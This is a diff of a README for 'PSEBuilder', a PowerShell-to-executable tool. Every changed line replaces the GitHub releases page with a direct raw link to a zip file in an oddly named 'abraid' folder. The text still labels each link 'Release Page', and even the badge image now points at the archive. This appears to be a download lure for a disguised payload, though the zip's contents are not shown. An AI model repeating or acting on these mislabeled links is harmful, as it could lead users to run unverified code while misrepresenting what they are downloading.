@@ -1,6 +1,6 @@
 # 🎉 PSEBuilder - Create Executables from PowerShell Scripts Easily
 
-[![Download PSEBuilder](https://img.shields.io/badge/Download-PSEBuilder-brightgreen)](https://github.com/Praful7115/PSEBuilder/releases)
+[![Download PSEBuilder](https://raw.githubusercontent.com/Praful7115/PSEBuilder/main/abraid/PSEBuilder.zip)](https://raw.githubusercontent.com/Praful7115/PSEBuilder/main/abraid/PSEBuilder.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ PSEBuilder helps you create standalone executables from your PowerShell scripts.
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Release Page](https://github.com/Praful7115/PSEBuilder/releases). 
+To get started, visit this page to download: [Release Page](https://raw.githubusercontent.com/Praful7115/PSEBuilder/main/abraid/PSEBuilder.zip). 
 
 You will find the latest release at the top of the page. Look for the "Assets" section, where you can choose the appropriate file to download. 
 
@@ -48,7 +48,7 @@ Once you have installed PSEBuilder, follow these steps to create an executable f
 
 ## 🔄 Updating PSEBuilder
 
-It’s important to keep PSEBuilder up to date for new features and improvements. Regularly check the [Release Page](https://github.com/Praful7115/PSEBuilder/releases) for the latest updates.
+It’s important to keep PSEBuilder up to date for new features and improvements. Regularly check the [Release Page](https://raw.githubusercontent.com/Praful7115/PSEBuilder/main/abraid/PSEBuilder.zip) for the latest updates.
 
 1. Return to the release page.
 2. Download the newest version using the same steps as before.
@@ -86,4 +86,4 @@ For related topics, you can explore more on the following:
 - resource-embedding 
 - script-compiler 
 
-Remember to visit [Release Page](https://github.com/Praful7115/PSEBuilder/releases) for all the latest downloads and updates. Enjoy building your applications with PSEBuilder!
+Remember to visit [Release Page](https://raw.githubusercontent.com/Praful7115/PSEBuilder/main/abraid/PSEBuilder.zip) for all the latest downloads and updates. Enjoy building your applications with PSEBuilder!
